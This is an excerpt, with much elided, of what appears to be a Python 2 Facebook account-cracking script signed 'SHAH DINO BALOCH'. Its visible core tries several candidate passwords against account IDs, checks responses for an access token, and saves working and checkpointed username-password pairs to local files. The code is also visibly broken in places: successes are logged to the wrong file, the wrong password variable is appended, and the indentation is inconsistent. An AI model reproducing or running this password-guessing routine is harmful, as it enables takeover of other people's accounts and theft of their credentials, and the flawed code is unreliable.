...
(| (___\ |||.  | |.  \    \. |(: (____/ //  
|:       :)/\  |\|    \    \ | \        /   
(________/(__\_|_)\___|\____\)  \"_____/    
...
\x1b[1;96m\033[1;96mAuthor   :            SHAH DINO BALOCH
\x1b[1;96m\033[1;96mFacebook :          SHAH DINO
\x1b[1;96m\033[1;96mGitHub   :        github.com/DINOKING
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;96m  [SHAH.DINO_OK]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m  [SHAH.DINO_CP] ' + k + c + user + '  |  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m  [SHAH.DINO_OK] ' + k + c + user + '  |  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m  [SHAH.DINO_CP] ' + k + c + user + '  |  ' + pass2
                    cps = open('save/CP.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;96m  [SHAH.DINO_OK]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m  [SHAH.DINO_CP] ' + k + c + user + '  |  ' + pass3
                        cps = open('save/CP.txt', 'a')
                       ...
                       q = json.load(data)
                       if 'access_token' in q:
                        print '\x1b[1;96m  [SHAH.DINO_OK]  ' + k + c + user + '  |  ' + pass4
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass4 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                       elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m  [SHAH.DINO_CP] ' + k + c + user + '  |  ' + pass4
                        cps = open('save/CP.txt', 'a')
    ...
    raw_input('\n\x1b[1;97m[\x1b[1;98mSHAH.DINO_menu_Back\x1b[1;95m]')
    login()
